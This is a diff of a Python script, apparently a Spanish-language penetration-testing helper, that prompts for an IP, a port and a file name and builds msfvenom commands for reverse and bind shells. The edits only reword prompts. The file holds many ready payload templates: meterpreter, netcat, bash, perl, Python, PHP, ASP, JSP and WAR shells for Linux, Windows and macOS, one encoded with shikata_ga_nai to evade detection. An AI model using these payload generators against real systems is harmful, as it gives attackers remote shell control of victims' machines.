@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 #Script para generar reverse y binds shells con msfvenom
+#By Z0diacc 
 
 from colorama import Fore, Style
 import os, time, sys 
@@ -76,13 +77,14 @@ def opciones():
  
 opciones()
 
-#############BIND SHELLS##############
+
+#############REVERSE SHELLS##############
 
 
 def lmrs():
     lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%sLPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
     sleep(1)
@@ -90,9 +92,9 @@ def lmrs():
     print(" ")
             
 def wmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
     sleep(1)
@@ -101,9 +103,9 @@ def wmrs():
 
 
 def wrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
     sleep(1)
@@ -111,9 +113,9 @@ def wrs():
     print(" ")       
 
 def wemrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
     sleep(1)
@@ -121,9 +123,9 @@ def wemrs():
     print(" ")  
 
 def mrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
     sleep(1)
@@ -131,9 +133,9 @@ def mrs():
     print(" ")     
 
 def phpmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".php")
     sleep(1)
@@ -142,9 +144,9 @@ def phpmrs():
     print(" ")
     
 def aspmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
     sleep(1)
@@ -152,9 +154,9 @@ def aspmrs():
     print(" ")
 
 def aspmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
     sleep(1)
@@ -162,9 +164,9 @@ def aspmrs():
     print(" ")
 
 def jspmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".jsp")
     sleep(1)
@@ -172,9 +174,9 @@ def jspmrs():
     print(" ")
 
 def warmrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".war")
     sleep(1)
@@ -182,9 +184,9 @@ def warmrs():
     print(" ")    
 
 def pythonrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".py")
     sleep(1)
@@ -192,9 +194,9 @@ def pythonrs():
     print(" ")  
     
 def bashrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".sh")
     sleep(1)
@@ -202,9 +204,9 @@ def bashrs():
     print(" ") 
 
 def perlrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".pl")
     sleep(1)
@@ -212,9 +214,9 @@ def perlrs():
     print(" ") 
 
 def ncrs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST: ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p cmd/unix/reverse_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
     sleep(1)
@@ -224,9 +226,9 @@ def ncrs():
 #############BIND SHELLS##############
 
 def lmbs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST(remote): ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=%s LPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
     sleep(1)
@@ -234,9 +236,9 @@ def lmbs():
     print(" ")
     
 def lgbs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST(remote): ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p generic/shell_bind_tcp RHOST=%s LPORT=%s -f elf >  %s """%(lhost,lport,sname+".elf")
     sleep(1)
@@ -244,9 +246,9 @@ def lgbs():
     print(" ")
 
 def mbs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST(remote): ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell="""  msfvenom -p osx/x86/shell_bind_tcp RHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
     sleep(1)
@@ -254,9 +256,9 @@ def mbs():
     print(" ")    
 
 def ncbs():
-    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el  HOST(remote): ")
+    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
     lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
-    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce un NOMBRE: ")
+    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")
 
     bash_shell=""" msfvenom -p cmd/unix/bind_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
     sleep(1)
@@ -269,7 +271,7 @@ def ncbs():
 
 
 while True:
-    comando=input(Fore.GREEN + "msfvenom-gen$~" + Fore.RESET)
+    comando=input(Fore.GREEN + "z0diacc$~" + Fore.RESET)
     if(comando=="1"):
         lmrs()
     elif(comando=="2"):
